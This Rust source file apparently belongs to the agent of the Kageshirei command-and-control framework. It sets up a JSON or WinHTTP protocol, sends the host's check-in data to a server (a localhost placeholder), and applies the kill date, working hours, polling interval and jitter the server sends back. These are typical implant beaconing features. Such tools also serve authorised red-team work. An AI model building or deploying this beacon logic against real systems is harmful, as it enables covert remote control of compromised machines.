use alloc::sync::Arc;
use core::ffi::c_void;
use std::collections::BTreeMap;

use futures::pending;
use kageshirei_communication_protocol::{
    communication::CheckinResponse,
    error::{Format as FormatError, Protocol as ProtocolError},
    Format,
    Metadata,
    Protocol,
};
use kageshirei_crypt::encryption_algorithm::ident_algorithm::IdentEncryptor;
use kageshirei_format_json::FormatJson;
use kageshirei_runtime::Runtime;
use libc_print::{libc_eprintln, libc_println};
use mod_agentcore::{instance, instance_mut};
#[cfg(feature = "proto-http-winhttp")]
use mod_protocol_http::HttpProtocol;
#[cfg(feature = "protocol-json")]
use mod_protocol_json::protocol::JsonProtocol;

use super::system_data::checkin_from_raw;

/// Initializes the communication protocol and attempts to connect to the server.
pub fn initialize_protocol<R>(rt: Arc<R>)
where
    R: Runtime,
{
    #[cfg(feature = "protocol-json")]
    {
        let boxed_encryptor = Box::new(IdentEncryptor);
        let boxed_protocol: Box<JsonProtocol<IdentEncryptor>> =
            Box::new(JsonProtocol::new("http://localhost:80".to_string()));

        unsafe {
            instance_mut().session.encryptor_ptr = Box::into_raw(boxed_encryptor) as *mut c_void;
            instance_mut().session.protocol_ptr = Box::into_raw(boxed_protocol) as *mut c_void;
        }

        unsafe {
            let encryptor = encryptor_from_raw(instance().session.encryptor_ptr);
            let protocol = protocol_from_raw(instance().session.protocol_ptr);
            let protocol_read = protocol_from_raw(instance().session.protocol_ptr);

            // Check if the Checkin data is available in the global instance
            if let Some(checkin_ptr) = instance().pcheckindata.as_mut() {
                // Convert the raw pointer to a mutable reference to Checkin
                let checkin_data = checkin_from_raw(checkin_ptr);

                // Set the protocol to checkin mode
                protocol.set_is_checkin(true);

                // Attempt to write the Checkin data using the protocol
                let result = rt.block_on(async {
                    protocol
                        .write(checkin_data.clone(), Some(encryptor.clone()))
                        .await
                });

                if result.is_ok() {
                    let checkin_response: Result<CheckinResponse, anyhow::Error> =
                        protocol_read.read(result.unwrap(), Some(encryptor.clone()));

                    if checkin_response.is_ok() {
                        let checkin_response_data = checkin_response.unwrap();

                        instance_mut().config.id = checkin_response_data.id;
                        instance_mut().config.kill_date = checkin_response_data.kill_date;
                        instance_mut().config.working_hours = checkin_response_data.working_hours;
                        instance_mut().config.polling_interval = checkin_response_data.polling_interval;
                        instance_mut().config.polling_jitter = checkin_response_data.polling_jitter;

                        // If successful, mark the session as connected
                        instance_mut().session.connected = true;
                    }
                    else {
                        libc_eprintln!(
                            "Checkin Response Error: {}",
                            checkin_response.err().unwrap()
                        );
                    }
                }
                else {
                    libc_eprintln!("Error: {}", result.err().unwrap());
                }
            }
            else {
                // Handle error if Checkin data is null (currently commented out)
                libc_eprintln!("Error: Checkin data is null");
            }
        }
    }

    #[cfg(feature = "proto-http-winhttp")]
    {
        let boxed_protocol: Box<HttpProtocol> = Box::new(HttpProtocol::new("http://localhost".to_string()));
        let boxed_formatter: Box<FormatJson> = Box::new(FormatJson);

        unsafe {
            instance_mut().session.protocol_ptr = Box::into_raw(boxed_protocol) as *mut c_void;
            instance_mut().session.formatter_ptr = Box::into_raw(boxed_formatter) as *mut c_void;
        }

        unsafe {
            let protocol = protocol_from_raw(instance().session.protocol_ptr);
            let formatter = formatter_from_raw(instance().session.formatter_ptr);

            // Check if the Checkin data is available in the global instance
            if let Some(checkin_ptr) = instance().pcheckindata.as_mut() {
                // Convert the raw pointer to a mutable reference to Checkin
                let checkin_data = checkin_from_raw(checkin_ptr);

                // Set the protocol to checkin mode
                // protocol.set_is_checkin(true);

                let data = formatter
                    .write(checkin_data, None::<BTreeMap<&str, &str>>)
                    .unwrap();

                let result = rt.block_on(async { protocol.send(data, None).await });

                if result.is_ok() {
                    // let checkin_response: Result<CheckinResponse, String> =
                    //     protocol_read.read(result.unwrap(), Some(encryptor.clone()));

                    let checkin_response: Result<CheckinResponse, FormatError> =
                        formatter.read(result.unwrap().as_slice(), None::<BTreeMap<&str, &str>>);

                    if checkin_response.is_ok() {
                        // let checkin_response_data = checkin_response.unwrap();

                        // libc_println!("Checkin Response: {:?}", checkin_response_data);

                        // instance_mut().config.id = checkin_response_data.id;
                        // instance_mut().config.kill_date = checkin_response_data.kill_date;
                        // instance_mut().config.working_hours = checkin_response_data.working_hours;
                        // instance_mut().config.polling_interval = checkin_response_data.polling_interval;
                        // instance_mut().config.polling_jitter = checkin_response_data.polling_jitter;

                        // If successful, mark the session as connected
                        instance_mut().session.connected = true;
                    }
                    // else {
                    //     libc_eprintln!("{}", checkin_response.err().unwrap());
                    // }
                }
                else {
                    // libc_eprintln!("Error: {}", result.err().unwrap());
                    libc_eprintln!("Error: ");
                }
            }
            else {
                // Handle error if Checkin data is null (currently commented out)
                libc_eprintln!("Error: Checkin data is null");
            }
        }
    }
}

#[cfg(feature = "protocol-json")]
/// Function to retrieve a mutable reference to a JsonProtocl<IdentEncryptor> struct from a raw
/// pointer.
pub unsafe fn protocol_from_raw(ptr: *mut c_void) -> &'static mut JsonProtocol<IdentEncryptor> {
    &mut *(ptr as *mut JsonProtocol<IdentEncryptor>)
}

#[cfg(feature = "proto-http-winhttp")]
/// Function to retrieve a mutable reference to a JsonProtocl<IdentEncryptor> struct from a raw
/// pointer.
pub unsafe fn protocol_from_raw(ptr: *mut c_void) -> &'static mut HttpProtocol { &mut *(ptr as *mut HttpProtocol) }

/// Function to retrieve a mutable reference to a IdentEncryptor struct from a raw pointer.
pub unsafe fn encryptor_from_raw(ptr: *mut c_void) -> &'static mut IdentEncryptor { &mut *(ptr as *mut IdentEncryptor) }

/// Function to retrieve a mutable reference to a FormatJson struct from a raw pointer.
pub unsafe fn formatter_from_raw(ptr: *mut c_void) -> &'static mut FormatJson { &mut *(ptr as *mut FormatJson) }
